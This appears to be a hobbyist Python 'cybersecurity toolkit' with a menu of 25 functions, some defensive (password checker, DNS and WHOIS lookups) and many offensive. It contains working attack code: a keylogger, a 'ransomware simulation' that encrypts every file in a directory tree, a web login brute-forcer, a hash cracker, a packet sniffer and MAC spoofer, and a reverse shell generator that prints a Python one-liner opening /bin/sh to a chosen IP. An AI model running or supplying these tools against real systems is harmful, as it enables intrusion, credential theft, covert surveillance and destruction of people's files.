import hashlib
import socket
import scapy.all as scapy
import requests
import re
import os
import time
import whois
import dns.resolver
import uuid
import subprocess

# Remove or comment out this import if not needed
# import netifaces  # For network interface operations
from cryptography.fernet import Fernet
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import random

# Optional libraries for keylogger and steganography
try:
    from pynput import keyboard  # For keylogger functionality
except ImportError:
    print("pynput not installed. Keylogger may not work.")

try:
    from PIL import Image, PngImagePlugin  # For steganography functionality
except ImportError:
    print("Pillow not installed. Steganography may not work.")


# 1. Password Strength Checker
def password_strength_checker(password):
    """Checks the strength of a given password based on length and complexity, and provides feedback."""
    strength = "Very Weak"
    suggestions = []

    if len(password) < 6:
        strength = "Very Weak"
        suggestions.append("Increase the length of your password to at least 8 characters.")
    elif len(password) < 8:
        strength = "Weak"
        suggestions.append("Consider using at least 8 characters for better security.")

    if not re.search(r"[A-Z]", password):
        suggestions.append("Include at least one uppercase letter.")
    if not re.search(r"[0-9]", password):
        suggestions.append("Include at least one number.")
    if not re.search(r"[@$!%*?&]", password):
        suggestions.append("Include at least one special character (@, $, !, %, *, ?, &).")

    if len(password) >= 8 and re.search(r"[A-Z]", password) and re.search(r"[0-9]", password) and re.search(
            r"[@$!%*?&]", password):
        strength = "Strong"
    elif len(password) >= 8:
        strength = "Medium"

    print(f"Password Strength: {strength}")
    if suggestions:
        print("Suggestions to improve your password:")
        for suggestion in suggestions:
            print(f"- {suggestion}")

    # Add a delay before returning to the main menu
    print("\nReturning to the main menu in 3 seconds...")
    time.sleep(3)


# 2. Port Scanner
def port_scanner(target, start_port=1, end_port=1025, timeout=0.5):
    """Scans a target IP for open ports within the given range, with an adjustable timeout."""
    print(f"Scanning ports on {target} from {start_port} to {end_port} with a timeout of {timeout} seconds...")
    for port in range(start_port, end_port):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            if s.connect_ex((target, port)) == 0:
                print(f"Port {port} is open")


# 3. Encrypt/Decrypt File
def encrypt_decrypt_file(file_path, key=None, action="encrypt"):
    """
    Encrypts or decrypts a file using Fernet encryption.
    For decryption, the user is prompted to provide the encryption key.
    """
    if action == "decrypt":
        if not key:
            key = input("Enter the encryption key: ").strip().encode()
    else:
        key = key or Fernet.generate_key()

    cipher = Fernet(key)
    with open(file_path, 'rb') as file:
        data = file.read()
    processed_data = cipher.encrypt(data) if action == "encrypt" else cipher.decrypt(data)
    with open(file_path, 'wb') as file:
        file.write(processed_data)
    print(f"File {action}ed successfully!")
    if action == "encrypt":
        print(f"Encryption key (save this to decrypt later): {key.decode()}")


# 4. Hash Cracker
def hash_cracker(hash_to_crack, wordlist, hash_algorithm="md5"):
    """Attempts to crack a hash using a wordlist and the specified hash algorithm."""
    try:
        with open(wordlist, 'r', encoding='utf-8', errors='ignore') as file:
            for word in file:
                word = word.strip()
                if hash_algorithm == "md5":
                    hashed_word = hashlib.md5(word.encode()).hexdigest()
                elif hash_algorithm == "sha1":
                    hashed_word = hashlib.sha1(word.encode()).hexdigest()
                elif hash_algorithm == "sha256":
                    hashed_word = hashlib.sha256(word.encode()).hexdigest()
                else:
                    print("Unsupported hash algorithm.")
                    return
                if hashed_word == hash_to_crack:
                    print(f"Password Found: {word}")
                    return
        print("Password Not Found!")
    except Exception as e:
        print(f"Error reading wordlist: {e}")


# 5. Packet Sniffer
def packet_sniffer(interface, filter_protocol="all"):
    """Sniffs packets on a specified network interface and displays their summary."""
    try:
        print(f"Sniffing on {interface} for {filter_protocol} packets...")

        def packet_filter(pkt):
            if filter_protocol.lower() == "all":
                print(pkt.summary())
            elif hasattr(scapy, filter_protocol.upper()) and pkt.haslayer(getattr(scapy, filter_protocol.upper())):
                print(pkt.summary())

        scapy.sniff(iface=interface, prn=packet_filter, store=False)
    except Exception as e:
        print(f"Error sniffing packets: {e}")


# 6. Brute Force Login Tester
def brute_force_login(url, username, password_list, delay=1):
    """
    Attempts to brute-force login credentials by iterating over a list of passwords.
    A delay is used between attempts to avoid overloading the target.
    """
    try:
        with open(password_list, 'r', encoding='utf-8', errors='ignore') as file:
            for password in file:
                password = password.strip()
                response = requests.post(url, data={'username': username, 'password': password})
                if "incorrect" not in response.text.lower():
                    print(f"Login successful: {password}")
                    return
                time.sleep(delay)
        print("Brute force failed.")
    except Exception as e:
        print(f"Error during brute force: {e}")


# 7. MAC Address Changer
def change_mac(interface, new_mac):
    """Changes the MAC address of the specified network interface."""
    if not re.match("[0-9a-f]{2}([-:])[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", new_mac.lower()):
        print("Invalid MAC address format. Use format like 00:11:22:33:44:55")
        return
    try:
        if os.name == 'nt':  # Windows
            print("MAC address changing is not supported on Windows")
            return
        subprocess.run(["ifconfig", interface, "down"], check=True)
        subprocess.run(["ifconfig", interface, "hw", "ether", new_mac], check=True)
        subprocess.run(["ifconfig", interface, "up"], check=True)
        print(f"MAC address changed to {new_mac} on {interface}")
    except subprocess.CalledProcessError as e:
        print(f"Failed to change MAC address: {e}")
    except Exception as e:
        print(f"Error: {e}")


# 8. Subdomain Enumeration
def subdomain_enumeration(domain, subdomains_file):
    """Enumerates subdomains for a given domain using a provided list of subdomain prefixes."""
    try:
        with open(subdomains_file, 'r', encoding='utf-8', errors='ignore') as file:
            for sub in file:
                sub = sub.strip()
                subdomain = f"{sub}.{domain}"
                try:
                    socket.gethostbyname(subdomain)
                    print(f"Found subdomain: {subdomain}")
                except socket.gaierror:
                    pass
    except Exception as e:
        print(f"Error reading subdomains file: {e}")


# 9. WHOIS Lookup
def whois_lookup(domain):
    """Performs a WHOIS lookup to retrieve information about a domain."""
    try:
        domain_info = whois.whois(domain)
        print(domain_info)
    except Exception as e:
        print(f"Error retrieving WHOIS information: {e}")


# 10. IP Geolocation
def ip_geolocation(ip):
    """Fetches geolocation information for an IP address using ip-api.com."""
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()
        if data['status'] == 'success':
            for key, value in data.items():
                print(f"{key.capitalize()}: {value}")
        else:
            print("Failed to get geolocation data.")
    except Exception as e:
        print(f"Error fetching IP geolocation: {e}")


# 11. DNS Resolver
def dns_resolver(domain):
    """Resolves a domain to its IP address(es) using DNS resolution."""
    try:
        answers = dns.resolver.resolve(domain, 'A')
        for rdata in answers:
            print(f"{domain} has address {rdata}")
    except Exception as e:
        print(f"DNS resolution error: {e}")


# 12. Keylogger
def keylogger(duration=10, output_file="keylog.txt"):
    """
    Logs keystrokes for a specified duration (in seconds) and saves them to a file.
    Requires the 'pynput' library.
    """
    print(f"Starting keylogger for {duration} seconds. Output will be saved to {output_file}.")
    log = []
    start_time = time.time()

    def on_press(key):
        try:
            log.append(key.char)
        except AttributeError:
            log.append(f"[{key}]")

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    while time.time() - start_time < duration:
        time.sleep(0.1)
    listener.stop()
    with open(output_file, 'w') as f:
        f.write(''.join(log))
    print("Keylogging complete.")


# 13. Website Crawler
def website_crawler(start_url, max_pages=10):
    """Crawls a website starting from the given URL and prints found links."""
    visited = set()
    to_visit = [start_url]
    count = 0
    while to_visit and count < max_pages:
        url = to_visit.pop(0)
        if url in visited:
            continue
        try:
            response = requests.get(url)
            visited.add(url)
            print(f"Crawled: {url}")
            soup = BeautifulSoup(response.text, 'html.parser')
            for link in soup.find_all('a', href=True):
                full_url = urljoin(url, link['href'])
                if full_url not in visited:
                    to_visit.append(full_url)
            count += 1
        except Exception as e:
            print(f"Error crawling {url}: {e}")


# 14. Steganography - Hide Message in Image
def hide_message_in_image(input_image, output_image, message):
    """Hides a message inside a PNG image using metadata."""
    try:
        img = Image.open(input_image)
        meta = PngImagePlugin.PngInfo()
        meta.add_text("hidden_message", message)
        img.save(output_image, "PNG", pnginfo=meta)
        print(f"Message hidden in image {output_image}")
    except Exception as e:
        print(f"Error hiding message: {e}")


# 15. Steganography - Extract Message from Image
def extract_message_from_image(image_path):
    """Extracts a hidden message from a PNG image's metadata."""
    try:
        img = Image.open(image_path)
        message = img.info.get("hidden_message", None)
        if message:
            print(f"Hidden message: {message}")
        else:
            print("No hidden message found.")
    except Exception as e:
        print(f"Error extracting message: {e}")


# 16. Ransomware Simulation
def ransomware_simulation(directory):
    """
    Simulates ransomware by encrypting all files in a directory using Fernet encryption.
    WARNING: This function will modify files. Use it only in a controlled environment.
    """
    key = Fernet.generate_key()
    cipher = Fernet(key)
    print(f"Encryption key (save this to decrypt files): {key.decode()}")
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, 'rb') as f:
                    data = f.read()
                encrypted_data = cipher.encrypt(data)
                with open(file_path, 'wb') as f:
                    f.write(encrypted_data)
                print(f"Encrypted {file_path}")
            except Exception as e:
                print(f"Error encrypting {file_path}: {e}")


# 17. Tor Proxy Integration
def tor_proxy_integration(url):
    """
    Accesses a URL through the Tor network using a SOCKS5 proxy.
    Make sure Tor is running on your system (default port 9050).
    """
    proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }
    try:
        response = requests.get(url, proxies=proxies)
        print(response.text)
    except Exception as e:
        print(f"Error accessing {url} through Tor: {e}")


# 18. Firewall Rule Tester
def firewall_rule_tester(ip, port):
    """Tests if a firewall is blocking a connection to a specified IP and port."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(2)
        result = s.connect_ex((ip, port))
        if result == 0:
            print(f"Connection to {ip}:{port} succeeded. Firewall may not be blocking this port.")
        else:
            print(f"Connection to {ip}:{port} failed. Firewall may be blocking this port.")


# 19. Wireless Network Scanner
def wireless_network_scanner():
    """Scans for available wireless networks (Linux only, requires iwlist)."""
    try:
        result = subprocess.check_output(['sudo', 'iwlist', 'scanning'], stderr=subprocess.STDOUT)
        print(result.decode())
    except Exception as e:
        print(f"Error scanning wireless networks: {e}")


# 20. Rootkit Detector
def rootkit_detector():
    """
    Performs a basic (and not comprehensive) check for rootkits by looking for hidden files.
    Note: Real rootkit detection is much more complex.
    """
    print("Scanning for rootkits...")
    suspicious_files = []
    for root, dirs, files in os.walk('/'):
        for file in files:
            if file.startswith('.'):
                suspicious_files.append(os.path.join(root, file))
    if suspicious_files:
        print("Suspicious hidden files found:")
        for file in suspicious_files:
            print(file)
    else:
        print("No suspicious files found.")


# 21. Forensics File Recovery (Skeleton Implementation)
def forensics_file_recovery(directory):
    """Skeleton function for recovering deleted files (Not fully implemented)."""
    print(f"Attempting to recover files from {directory}... (Not fully implemented)")


# 22. Reverse Shell Generator
def reverse_shell_generator(ip, port):
    """Generates a Python reverse shell command for the specified IP and port."""
    shell = f"python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"{ip}\",{port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn(\"/bin/sh\")'"
    print("Reverse Shell Command:")
    print(shell)


# 23. HTTP Header Analysis
def http_header_analysis(url):
    """Fetches a URL and displays its HTTP headers."""
    try:
        response = requests.get(url)
        for header, value in response.headers.items():
            print(f"{header}: {value}")
    except Exception as e:
        print(f"Error fetching HTTP headers: {e}")


# 24. Email Address Validator
def email_address_validator(email):
    """
    Validates an email address format and checks if the domain has MX records.
    Returns True if valid, False otherwise.
    """
    regex = r"(^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$)"
    if re.match(regex, email):
        domain = email.split('@')[1]
        try:
            records = dns.resolver.resolve(domain, 'MX')
            if records:
                print(f"{email} is valid and domain has MX records.")
                return True
        except Exception as e:
            print(f"{email} is in valid format but domain does not have MX records: {e}")
            return False
    else:
        print(f"{email} is not a valid email address.")
        return False


# 25. OSINT Toolkit Integration (Skeleton Implementation)
def osint_toolkit_integration(query):
    """Skeleton function for OSINT operations based on a query (Not fully implemented)."""
    print(f"Performing OSINT search for: {query}... (Not fully implemented)")


def get_network_interfaces():
    if os.name == 'nt':  # Windows
        interfaces = subprocess.check_output("ipconfig /all", shell=True).decode()
        print("Network Interfaces:\n", interfaces)
    else:  # Unix/Linux/Mac
        interfaces = subprocess.check_output("ifconfig", shell=True).decode()
        print("Network Interfaces:\n", interfaces)


def get_local_ip():
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    print("Local IP Address:", local_ip)


def get_mac_address():
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)][::-1])
    print("MAC Address:", mac)


# Main menu to navigate through all features
def main():
    while True:
        print("""
Milan's Cybersecurity Toolkit:
1.  Password Strength Checker
2.  Port Scanner
3.  Encrypt/Decrypt File
4.  Hash Cracker
5.  Packet Sniffer
6.  Brute Force Login Tester
7.  MAC Address Changer
8.  Subdomain Enumeration
9.  WHOIS Lookup
10. IP Geolocation
11. DNS Resolver
12. Keylogger
13. Website Crawler
14. Steganography (Hide Message in Image)
15. Steganography (Extract Message from Image)
16. Ransomware Simulation
17. Tor Proxy Integration
18. Firewall Rule Tester
19. Wireless Network Scanner
20. Rootkit Detector
21. Forensics File Recovery
22. Reverse Shell Generator
23. HTTP Header Analysis
24. Email Address Validator
25. OSINT Toolkit Integration
26. Exit
        """)
        choice = input("Select an option: ").strip()

        if choice == "1":
            password = input("Enter password: ")
            password_strength_checker(password)
        elif choice == "2":
            target = input("Enter target IP: ")
            start_port = int(input("Enter starting port: "))
            end_port = int(input("Enter ending port: "))
            timeout = float(input("Enter timeout for each connection attempt (default 0.5s): ") or 0.5)
            port_scanner(target, start_port, end_port, timeout)
        elif choice == "3":
            file_path = input("Enter file path: ")
            action = input("Do you want to encrypt or decrypt the file? (encrypt/decrypt): ").strip().lower()
            key = None if action == "decrypt" else Fernet.generate_key()
            encrypt_decrypt_file(file_path, key, action)
        elif choice == "4":
            hash_to_crack = input("Enter hash: ")
            wordlist = input("Enter wordlist file path: ")
            hash_algorithm = input("Enter hash algorithm (md5, sha1, sha256): ").strip().lower()
            hash_cracker(hash_to_crack, wordlist, hash_algorithm)
        elif choice == "5":
            interface = input("Enter network interface (e.g., eth0, wlan0): ")
            filter_protocol = input("Enter packet protocol to filter (e.g., TCP, UDP, all): ").strip()
            packet_sniffer(interface, filter_protocol)
        elif choice == "6":
            url = input("Enter login URL: ")
            username = input("Enter username: ")
            password_list = input("Enter password list file path: ")
            delay = float(input("Enter delay between attempts in seconds (default 1): ") or 1)
            brute_force_login(url, username, password_list, delay)
        elif choice == "7":
            interface = input("Enter network interface (e.g., eth0, wlan0): ")
            new_mac = input("Enter new MAC address: ")
            change_mac(interface, new_mac)
        elif choice == "8":
            domain = input("Enter domain (e.g., example.com): ")
            subdomains_file = input("Enter subdomains list file path: ")
            subdomain_enumeration(domain, subdomains_file)
        elif choice == "9":
            domain = input("Enter domain to look up: ")
            whois_lookup(domain)
        elif choice == "10":
            ip = input("Enter IP address: ")
            ip_geolocation(ip)
        elif choice == "11":
            domain = input("Enter domain to resolve: ")
            dns_resolver(domain)
        elif choice == "12":
            duration = int(input("Enter duration for keylogging (in seconds): "))
            output_file = input("Enter output file name (default keylog.txt): ") or "keylog.txt"
            keylogger(duration, output_file)
        elif choice == "13":
            start_url = input("Enter starting URL: ")
            max_pages = int(input("Enter maximum pages to crawl (default 10): ") or 10)
            website_crawler(start_url, max_pages)
        elif choice == "14":
            input_image = input("Enter input image path (PNG): ")
            output_image = input("Enter output image path (PNG): ")
            message = input("Enter message to hide: ")
            hide_message_in_image(input_image, output_image, message)
        elif choice == "15":
            image_path = input("Enter image path (PNG): ")
            extract_message_from_image(image_path)
        elif choice == "16":
            directory = input("Enter directory path to encrypt (simulation): ")
            ransomware_simulation(directory)
        elif choice == "17":
            url = input("Enter URL to access through Tor: ")
            tor_proxy_integration(url)
        elif choice == "18":
            ip = input("Enter IP address: ")
            port = int(input("Enter port: "))
            firewall_rule_tester(ip, port)
        elif choice == "19":
            wireless_network_scanner()
        elif choice == "20":
            rootkit_detector()
        elif choice == "21":
            directory = input("Enter directory path for file recovery: ")
            forensics_file_recovery(directory)
        elif choice == "22":
            ip = input("Enter listener IP for reverse shell: ")
            port = int(input("Enter listener port for reverse shell: "))
            reverse_shell_generator(ip, port)
        elif choice == "23":
            url = input("Enter URL: ")
            http_header_analysis(url)
        elif choice == "24":
            email = input("Enter email address: ")
            email_address_validator(email)
        elif choice == "25":
            query = input("Enter OSINT query: ")
            osint_toolkit_integration(query)
        elif choice == "26":
            confirm = input("Are you sure you want to exit? (yes/no): ").strip().lower()
            if confirm == "yes":
                break
        else:
            print("Invalid option! Try again.")


# Entry point of the program
if __name__ == "__main__":
    main()